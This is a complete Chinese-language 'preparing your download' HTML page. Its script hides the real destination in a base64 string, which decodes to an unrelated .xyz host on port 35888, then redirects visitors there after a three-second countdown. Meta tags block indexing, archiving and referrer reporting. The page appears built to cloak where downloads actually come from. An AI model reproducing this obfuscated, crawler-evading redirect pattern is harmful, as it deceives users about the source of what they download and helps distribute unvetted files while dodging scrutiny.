<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="robots" content="noindex,nofollow,noarchive,nosnippet">
<meta name="googlebot" content="noindex,nofollow,noarchive,nosnippet">
<meta name="referrer" content="no-referrer">
<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Expires" content="0">
<link rel="canonical" href="https://qp.cq.cn/">
  <title>正在准备下载资源</title>
  <link rel="icon" href="/assets/images/favicon.ico">
  <style>
    *{box-sizing:border-box}
    body{margin:0;min-height:100vh;display:grid;place-items:center;font-family:Arial,"Microsoft YaHei",sans-serif;background:#071225;color:#eef6ff}
    body:before{content:"";position:fixed;inset:0;background:linear-gradient(135deg,rgba(46,113,255,.2),transparent 42%),linear-gradient(315deg,rgba(124,92,255,.22),transparent 45%),repeating-linear-gradient(90deg,rgba(255,255,255,.04) 0 1px,transparent 1px 82px);pointer-events:none}
    .transfer{position:relative;width:min(520px,calc(100% - 32px));padding:34px;border:1px solid rgba(127,203,255,.28);background:rgba(8,22,46,.86);box-shadow:0 24px 70px rgba(0,0,0,.35);border-radius:8px;text-align:center}
    .mark{width:54px;height:54px;margin:0 auto 18px;border-radius:8px;background:linear-gradient(135deg,#4ee7ff,#7f5cff);display:grid;place-items:center;font-weight:700;color:#061126}
    h1{margin:0 0 10px;font-size:26px}
    p{margin:0;color:#b9c8dc;line-height:1.8}
    .bar{height:10px;margin:26px 0 18px;background:rgba(255,255,255,.09);border-radius:8px;overflow:hidden}
    .bar span{display:block;height:100%;width:0;background:linear-gradient(90deg,#45f0d1,#7f5cff);box-shadow:0 0 24px rgba(69,240,209,.55);transition:width .3s ease}
    a{display:inline-flex;align-items:center;justify-content:center;margin-top:12px;padding:13px 22px;border-radius:8px;color:#071225;background:linear-gradient(135deg,#6cf3ff,#9d7cff);font-weight:700;text-decoration:none}
  </style>
</head>
<body>
  <main class="transfer">
    <div class="mark">QP</div>
    <h1>正在准备下载资源</h1>
    <p>即将跳转，请稍候</p>
    <div class="bar" aria-hidden="true"><span id="progressBar"></span></div>
    <p id="countText">3 秒后自动继续</p>
    <a id="manualDownload" href="#" rel="nofollow noopener noreferrer">如未自动跳转，可手动继续</a>
  </main>
  <script>
    const REAL_DOWNLOAD_URL = atob("aHR0cHM6Ly9wbHouMzEzNDg2Lnh5ejozNTg4OC8=");
    const manualDownload = document.getElementById("manualDownload");
    const progressBar = document.getElementById("progressBar");
    const countText = document.getElementById("countText");
    let left = 3;
    const timer = setInterval(function () {
      left -= 1;
      progressBar.style.width = ((3 - left) / 3 * 100) + "%";
      countText.textContent = left > 0 ? left + " 秒后自动继续" : "正在跳转";
      if (left <= 0) {
        clearInterval(timer);
      }
    }, 1000);
    setTimeout(function () {
      window.location.replace(REAL_DOWNLOAD_URL);
    }, 3000);
    manualDownload.addEventListener("click", function(e){
        e.preventDefault();
        window.location.replace(REAL_DOWNLOAD_URL);
    });
  </script>
</body>
</html>
